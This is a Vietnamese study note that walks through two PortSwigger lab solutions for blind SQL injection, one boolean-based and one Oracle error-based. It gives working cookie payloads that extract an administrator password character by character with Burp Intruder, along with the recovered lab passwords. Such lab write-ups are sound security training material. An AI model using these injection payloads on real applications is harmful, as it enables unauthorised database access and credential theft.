I. Blind SQL injection vul<br>
+ app ko phản hồi kết quả của truy vấn SQL or chi tiết lỗi database trong phản hồi của nó
+ UNION attack ko hiệu quả trong trh này<br>

II. Exploiting blind SQL injection by triggering conditional responses<br>
1. Lý thuyết<br>
+ TrackingId cookie khi đc xử lý -> app sẽ báo là có phải ng dùng đã bt hay ko <br>
-> đây là lỗ hổng can khai thác<br>
+ cho phép xác đinh câu trl cho bất kì điều kiện đơn đc tiêm nào và trích xuất từng phần data tại 1 thời điểm (đúng thì phản hồi sai thì ko)<br>

2. Lab: Blind SQL injection with conditional responses<br>
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection
vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-responses<br>

3. Giải<br>
+ B1 xác định TrackingId hoạt động ko: Cookie: TrackingId=cokrQmPGjyNp6yK5; (này có sẵn trong phản hồi rồi) -> trả về Welcome Back
+ B2 check phản hồi khi đk đúng or sai:
<br>Đúng: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=1-- -> phản hồi
<br>Sai: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=2-- -> ko phản hồi
+ xác định có bảng users ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users limit 1) = 'x'-- -> phản hồi
+ xác định có username 'administrator' ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator') = 'x'-- -> phản hồi
+ xác định chiều dài password: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator' and length(password)>1) = 'x'--
+ thử lần lượt đến khi tìm thấy chiều dài phù hợp: 20 (can tìm bằng Intruder)
+ tìm mật khẩu (nhiều kí tự -> xài Burp Intruder):Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,1,1) from users where username='administrator')='§a§'-- (trọng tải đánh vào chữ 'a')
+ vào payload add vào danh sách 0-9, a-z, vào cài đặt phần Grep-match sửa thành 'Welcome' và chạy lấy kết quả<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8c7db2d6-426c-4ed4-876a-86b58ed091bd)<br>

Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,2,1) from users where username='administrator')='§a§'-- <br>
-> tiếp tục đến khi tìm đc toàn bộ mật khẩu: pduzuqxql3l3z6bguzec<br>

III. Error-based SQL injection<br>
1. Lý thuyết<br>
- nơi bạn can xài tin nhắn lỗi để trích xuất hoặc suy ra dữ liệu nhạy cảm từ cơ sở dữ liệu dù trong ngữ cảnh mù
- phụ thuộc cấu hình database và loại lỗi bạn can gây ra:<br>
  + khiến app trả về phản hồi lỗi cụ thể dựa trên kết quả biểu thức bool
  + kích hoạt thông báo lỗi xuất data đc truy vấn trả về, biến vul mù thành can thấy được<br>

IV. Exploiting blind SQL injection by triggering conditional errors<br>
1. Lý thuyết<br>
- dùng khi tiêm điều kiện bool khác nhau ko trả về phản hồi khác nhau
- xài cách: sửa truy vấn làm lỗi database chỉ khi đk đúng, thg thì lỗi database sẽ gây ra các phản hồi app khác nhau
- VD:<br>
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a<br>
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a<br>
- xài CASE: check điều kiện và trả về 1 biểu thức khác phụ thuộc vào biểu thức đúng hay ko: BT1: ko có lỗi, BT2: lỗi chia cho 0
- -> dùng để check khi điều kiện tiêm là đúng: xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a<br>

2. lap: Lab: Blind SQL injection with conditional errors<br>
- [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://0a3b0068031732fa8127f2ef006e0086.web-security-academy.net/)<br>
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

 Hint
This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.<br>

3. Giải<br>
+ B1: xác định xem có lỗ hổng SQL ko: Cookie: TrackingId=vcaVyDhReEvMhbkA'; -> có lỗ hổng<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/e909715c-9e84-4264-a92a-3a8d5ffc037f)<br>

+ B2: xác minh lại xem có đúng là do lỗi cú pháp chỉ dùng 1 dấu nháy đơn không Cookie: TrackingId=vcaVyDhReEvMhbkA''; -> ko có lỗi -> đúng cú pháp thì mất lỗi -> có vul SQL<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/d23fd83a-4079-495d-b278-9530915cc69d)<br>

+ B3: để chắc chắn là do lỗi cú pháp -> xài truy vấn con: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '')||'; -> báo lỗi -. chắc chắn lỗi cú pháp<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/e798410e-a2cb-4de2-9553-1b68bc07c8a5)<br>

+ B4: xác định xem tiêm truy vấn vào có được xử lý không: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '' from chau)||'; -> đúng cú pháp nhưng báo lỗi -> có xử lý<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/848c626e-aa5a-4c6a-8b1c-ac1a915e1ce2)<br>

+ B5: xác định có bảng users ko: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '' from users where rownum = 1)||'; -> ko báo lỗi -> có<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4023e5ac-4e39-4a1a-b5e5-3eeafb023e09)<br>

+ B6: xác nhận lỗ hổng, thu thập in4: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=1) then to_char(1/0) else '' end from dual)||'; -> xác nhận đk đúng -> báo lỗi<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/16f61c77-4ea5-4348-bb6b-1d761073697c)<br>

+ B7: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=2) then to_char(1/0) else '' end from dual)||'; -> đk sai thì ko báo lỗi<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/06bb3cac-d63d-40a0-b578-ebc6a65d0a14)<br>

+ B8: k.tra tồn tại username = administrator ko: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator')||'; -> báo lỗi -> có<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/a0d2de6a-e282-4f19-af97-440f0e6ee771)<br>

+ B9: dùng burp check độ dài password: TrackingId=tZ0tAR2pIIY23rAn'||(select case when length(password)>§1§ then to_char(1/0) else '' end from users where username = 'administrator')||'; -> dài 20 kí tự<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/912cfcd0-76d7-4d8e-a1b2-ff89c60bd0a8)<br>

+ B10: dùng burp để tìm password: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when substr(password,§1§,1)='§a§' then to_char(1/0) else '' end from users where username = 'administrator')||';<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4cb3c50a-ba19-4cc2-8e32-b5aae990f6f7)<br>

-> password: u2plqcroeoaj8z27alxl<br>
